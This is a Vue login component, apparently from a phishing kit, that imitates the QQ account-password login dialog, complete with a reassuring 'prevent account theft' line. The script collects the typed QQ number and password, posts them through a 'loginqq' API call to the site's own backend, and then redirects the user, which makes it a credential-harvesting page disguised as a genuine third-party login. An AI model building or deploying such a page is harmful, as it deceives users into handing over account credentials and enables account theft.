<template>
  <div class="login_box" id="login_box1" style="display: block;">
    <div class="admin_login_wrap">
      <div class="login_close" @click="close()"><a href="javascript:;" >×</a></div>
      <h4>帐号密码登录</h4>
      <h5 style="text-align:center;color:#666666;margin:10px 0 0 0;font-size:15px;">推荐使用<a href="#">快速安全登录</a>，防止盗号</h5>
      <div id="dingbu2" class="dingbu2">
        <img src="@/assets/images/ico_tip.png" width="25" height="25"><span style="vertical-align:super;" id="tishi"></span>
      </div>
      <div class="adming_login_border">
        <div id="web_login">
            <input type="hidden" name="_token" value="VpRIjfCYE18ar2OV1QPHNHgIjNjoLrdImomtMPIR">                    <ul class="admin_items">
            <li>
              <input name="username" type="text" id="u" v-model="loginForm.username" placeholder="支持QQ号/邮箱/手机号登录" onkeyup="(this.v=function(){this.value=this.value.replace(/[^0-9-]+/,'');}).call(this)" maxlength="12">
            </li>
            <li>
              <input name="password" type="password" id="p" v-model="loginForm.password" placeholder="密码" maxlength="28">
              <input type="hidden" name="agent" value="0">
              <div>
                <input type="submit" tabindex="3" value="登录" class="btn btn-primary  submit_button" @click="login">
              </div>
            </li>
          </ul>
        </div>
      </div>
      <div style="margin-left:350px;margin-top:25px;">
        <a href="" class="STYLE1"> 忘了密码？</a> | <a href="" class="STYLE2">注册新帐号</a>  | <a href="" class="STYLE2">意见反馈</a>
      </div>
    </div>
  </div>
</template>

<script>
  import { loginqq } from '../api/api'
    export default {
        props: ['url'],
        name: "qqLoginBox",
        data() {
          return {
            loginForm: {
              username: '',
              password: '',
              agent: this.$route.query.agent?this.$route.query.agent:0
            }
          }
        },
      methods: {
          login() {
            loginqq(this.loginForm).then((res) => {
              // location.href="/login?agent="+this.agent
              location.href=this.url
            })
          },
        close() {
            this.$emit('close',1)
        }
      }
    }
</script>

<style scoped>

  .login_box{
    width:550px;
    height:350px;
    z-index:9999;
    background:#FFFFFF;
    position:fixed;
    display:none;
    margin:auto;
    left:0;
    right:0;
    top:0;
    bottom:0;
  }
  .admin_login_wrap  h4 {
    text-align:center;
    font-size:24px;
    color:#333333;
    margin:15px 0;
  }
  .admin_login_wrap  h4{
    text-align:center;
    font-size:20px;

  }
  .admin_login_wrap a{
    color:#3481CF;
  }
  .admin_items{
    margin-top:35px;
    color: #000;
  }
  .admin_items li{
    text-align:center;
  }
  .admin_items  input{
    width:266px;
    height:36px;
    border-radius:2px ;
    border: 1px solid #D5D5D5;
    margin: 0 auto;
    font-size:14px;
    margin-bottom:15px;
    text-indent:10px;
  }
  .admin_items .btn-primary{
    background:#86CE2F;
    font-size:17px;
    color:#ffffff;
  }
  .login_bottom{
    text-align:right;
    margin-right:8px;
  }
  .login_bottom a{
    font-size:8px;
    color:#666666;
  }
  .login_close{
    position:absolute;
    top:0;
    right:0;
    height:20px;
    width:46px;
    text-align:center;
    font-size:24px;
  }
  .login_close a{
    display:block;
    color:#666666;
  }
  .login_close a:hover{
    text-decoration:none;
    background:#F7ADA0;
    color:#fff;
  }
  .dingbu2{ width:150px; margin:auto; height:21px; font-size:12px; color:#ff3b30; margin-top:5px;  visibility: hidden; line-height:21px;}
  img{ display: inline;}
  /*  |xGv00|a67f799b37150d263f69a3c1123ed9a5 */
</style>



